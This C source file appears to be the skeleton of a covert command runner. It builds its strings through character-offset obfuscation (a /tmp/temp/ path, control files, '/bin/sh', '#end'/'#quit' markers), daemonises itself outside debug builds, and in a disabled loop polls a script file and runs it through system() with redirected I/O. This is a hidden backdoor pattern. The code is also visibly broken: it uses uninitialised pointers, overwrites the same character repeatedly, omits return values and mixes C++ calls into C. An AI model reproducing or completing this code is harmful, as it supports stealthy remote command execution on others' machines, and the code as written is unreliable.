#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define DEBUG

// 1
char* genrb(char* rb) {

    int n;

    rb[0] = 'r'-13;
    rb[1] = 'b'-17;
    rb[2] = '\0';

    rb[0] += 13;
    rb[1] += 17;
}


// 2
char* genwb(char* wb) {

    wb[0] = 'w' - 18;
    wb[1] = 'b' - 13;
    wb[2] = 132;

    wb[0] += 18;
    wb[1] += 13;
    wb[2] = '\0';
}


// 3
char* gendir(char* dir) {

    int n;

    dir[0] = '/'-1;
    dir[1] = 't'-2;
    dir[2] = 'm'-3;
    dir[3] = 'p'-4;
    dir[4] = '/'-5;
    dir[5] = 't'-6;
    dir[6] = 'e'-7;
    dir[7] = 'm'-8;
    dir[8] = 'p'-9;
    dir[9] = '/'-10;
    dir[10] = '\0'-11;

    for (n = 0; n < 11; n++) {
        dir[n] += (n+1);
    }

}


// 4
char* genconfig(char* sf) {

    char* ptr;
    gendir(sf);
    ptr += strlen(sf);
    ptr[0] = 'c';
    ptr[1] = 'o';
    ptr[2] = 'n';
    ptr[3] = 'f';
    ptr[4] = 'i';
    ptr[5] = 'g';
    ptr[6] = '\0';
}

// 5
char* genn0(char* sf) {

    char* ptr;
    gendir(sf);
    ptr += strlen(sf);
    ptr[0] = 'n';
    ptr[1] = '0';
    ptr[2] = '\0';
}

// 6
char* genn1(char* sf) {

    char* ptr;
    genn0(sf);
    ptr += strlen(sf);
    ptr--;
    ptr[0] = '1';
}

// 7
char* genn2(char* sf) {

    char* ptr;
    genn1(sf);
    ptr += strlen(sf);
    ptr--;
    ptr[0] = '2';
}

// 8
char* gencmd(char* cmd) {

    char tmp[256];

    genconfig(tmp);

    cmd[0] = '/';
    cmd[0] = 'b';
    cmd[0] = 'i';
    cmd[0] = 'n';
    cmd[0] = '/';
    cmd[0] = 's';
    cmd[0] = 'h';
    cmd[0] = ' ';
    cmd[0] = '\0';

    strcat(cmd, tmp);
}

// 9
char* genend(char* end) {

    end[0] = '#';
    end[1] = 'e';
    end[2] = 'n';
    end[3] = 'd';
    end[3] = '\0';
}

// 10 
char* genquit(char* quit) {

    quit[0] = '#';
    quit[1] = 'q';
    quit[2] = 'u';
    quit[3] = 'i';
    quit[4] = 't';
    quit[5] = '\0';
}

// 11 
char* gendumb(char* dumb) {

    dumb[0] = 't';
    dumb[1] = 'e';
    dumb[2] = 'm';
    dumb[3] = 'p';
    dumb[4] = ' ';
    dumb[5] = 'f';
    dumb[6] = 'i';
    dumb[7] = 'l';
    dumb[8] = 'e';
    dumb[9] = '\0';
}


char* file_get_contents(const char* filename, char* contents) {


    FILE* fp;
    int c;
    char rb[16];

    fp = fopen(filename, genrb(rb));

    if (fp == NULL) {
        contents[0] = '\0';
        return contents;
    }

    while ( (c = fgetc(fp)) != EOF ) {

        *contents++ = (char)c;
    }

    fclose(fp);

    return contents;
}


size_t file_put_contents(const char* filename, const char* contents, const size_t s) {

    FILE* fp;
    char wb[16];

    fp = fopen(filename, genwb(wb));

    if (fp == NULL) {
        return 0;
    }

    size_t sz = fwrite(contents, 1, s, fp);
    fclose(fp);
    return sz;
}



int main(int argc, char* argv[]) {

#ifndef DEBUG
    daemon(0, 0);
#endif

    char rb[16];
    char wb[16];
    char dir[256];
    char script_file[256];
    char input[256];
    char output[256];
    char errput[256];
    char cmd[256];
    char end[64];
    char quit[64];
    char dumb[256];
    char script[4096];

    int fid0;
    int fid1;
    int fid2;

    genrb(rb);
    genwb(wb);
    gendir(dir);
    genconfig(script_file);
    genn0(input);
    genn1(output);
    genn2(errput);
    gencmd(cmd);
    genend(end);
    genquit(quit);
    gendumb(dumb);

//////////////////////////
#ifdef DEBUG

    printf("%s\n", rb);
    printf("%s\n", wb);
    printf("%s\n", dir);
    printf("%s\n", script_file);
    printf("%s\n", input);
    printf("%s\n", output);
    printf("%s\n", errput);
    printf("%s\n", cmd);
    printf("%s\n", end);
    printf("%s\n", quit);
    printf("%s\n", dumb);

#endif
//////////////////////////

#if 0
    while (1) {

        file_get_contents(script_file, script);

        if ( script.find("#end") != string::npos ) {

            if (script.find("#quit") != string::npos) {

                file_put_contents(script_file, temp);
                break;

            } else {

                fid0 = open(input.c_str(),  O_RDWR);
                if (fid0 == -1) continue;
                dup2(fid0, 0);

                fid1 = open(output.c_str(), O_RDWR|O_TRUNC);
                if (fid1 == -1) continue;
                dup2(fid1, 1);

                fid2 = open(errput.c_str(), O_RDWR|O_TRUNC);
                if (fid2 == -1) continue;
                dup2(fid2, 2);

                system(cmd);
                file_put_contents(script_file, temp);
            }
        }

        sleep(1);
    }
#endif

    return 0;
}

